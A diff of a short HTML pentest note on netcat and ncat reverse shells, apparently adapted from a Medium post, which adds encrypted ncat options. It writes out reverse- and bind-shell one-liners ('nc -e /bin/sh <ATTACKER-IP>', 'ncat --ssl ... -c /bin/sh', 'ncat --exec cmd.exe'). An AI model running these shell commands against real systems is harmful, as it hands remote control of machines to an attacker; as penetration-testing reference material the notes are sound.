@@ -2,7 +2,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Netcat</title>
+<title>Ncat and nc</title>
 </head><body>https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c<br/>
 In many tutorials and unfortunately also in the productive environment, netcat ( nc ) is used to establish a connection between the attacker system and the target system. The attacker starts with nc -lvp &lt;PORT&gt; a listener and spawns with nc -e /bin/sh &lt;ATTACKER-IP&gt; &lt;PORT&gt; a shell on the target system. The problem is that this connection is unencrypted. All data that is transported via this reverse shell (passwords, keys, personal data, critical company internal information, etc.) are published more or less. This is not acceptable in the field of penetration testing.<br/>
 <br/>
@@ -13,7 +13,11 @@ As an alternative to nc there is ncat . The problem is, however, that ncat is no
 Listener: ncat --ssl -l &lt;PORT&gt;<br/>
 Shell: ncat --ssl &lt;ATTACKER-IP&gt; &lt;PORT&gt; -c /bin/sh<br/>
 <br/>
-Look to openssl as an alterative<br/>
+Advanced options:<br/>
+Listener: ncat --exec cmd.exe --alow &lt;LHOST&gt; -vnl 4444 --ssl<br/>
+Attacker: ncat -v &lt;RHOST&gt; 4444 --ssl<br/>
+<br/>
+Look to openssl or sbd as an alterative<br/>
 <br/>
 <br/>
 LISTEN WITH: nc -lvvnp &lt;LPORT&gt;<br/>
